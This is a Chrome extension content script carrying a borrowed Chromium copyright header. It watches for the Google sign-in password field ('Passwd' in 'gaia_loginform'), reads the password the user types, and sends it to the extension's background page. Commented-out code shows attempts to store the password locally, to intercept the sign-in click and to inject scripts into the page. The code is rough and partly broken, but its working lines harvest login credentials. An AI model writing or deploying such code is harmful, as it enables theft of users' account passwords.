/*
 * Copyright (c) 2010 The Chromium Authors. All rights reserved.  Use of this
 * source code is governed by a BSD-style license that can be found in the
 * LICENSE file.
 */
var regex = /password/;
var form = document.getElementById('gaia_loginform');

if(document.getElementById('Passwd'))
  {
    //var inputs = document.getElementByTagName('input');
	  //alert(a.length);
    //alert("There is a password");
    var value = document.getElementById('Passwd').value;
    //var form = document.getElementById('gaia_loginform');
    //alert(value);
    //alert(form.elements["Email"].value);
    if(document.getElementById('Passwd').value == '')
    {
        alert("null");
    }
    else
    {
      alert("not null");
      //localStorage["password"] = document.getElementById('Passwd').value;
      //alert(localStorage["Passwords"]);

        //chrome.storage.local.set({“Password”, document.getElementById('Passwd').value)},function(){alert("stored");});
        //document.write(localStorage.getItem(“Password”));
    }
    var val = form.elements["Passwd"].value;
    var currentURL = document.location.href;
    //alert(currentURL);
    //for( var i=0; i<document.forms.length; i++)
    //{
      /**
      var signup = document.getElementById('signIn');
      signup.addEventlistener('onclick', function(evt){
      //var data = [form.elements["Email"].value, form.elements["Passwd"].value];
      var val = document.getElementById('Passwd').value;
      evt.preventDefault();
      alert(document.getElementById('Passwd').value);
      //chrome.extension.sendRequest({'data':val}, function(response){alert(response);}
      );
      **/
    /**
    var actualCode = 'function evt() {'
               + '    console.log("The state of the player has changed");'
               + '}';
  
    $('#Passwd').click("hello",function(){
      alert"alaets");
    });
**/
    /**
    var s = document.createElement('script');
    s.type = "text/JavaScript";
    //s.src = document.exdtension.getURL.('new.js');
    //s.textContent = actualCode;
    (document.head||document.documentElement).appendChild(s);
    s.onload = function(){
      s.parentNode.removeChild(this);
    };

    document.addEventListener('RW759_connectExtension', function(e) {
    // e.detail contains the transferred data (can be anything, ranging
    // from JavaScript objects to strings).
    // Do something, for example:
    //e.detail = val;
    e.preventDefault();
    alert(e.detail);
    });
    **/

	  chrome.extension.sendRequest({'data':val},function(response) {alert(response);});
  
  }

// Test the text of the body element against our regular expression.
if (regex.test(document.body.innerText)) {
  // The regular expression produced a match, so notify the background page.
  //chrome.extension.sendRequest({}, function(response) {});
  //alert("hello1");
} 

else {
  // No match was found.
}
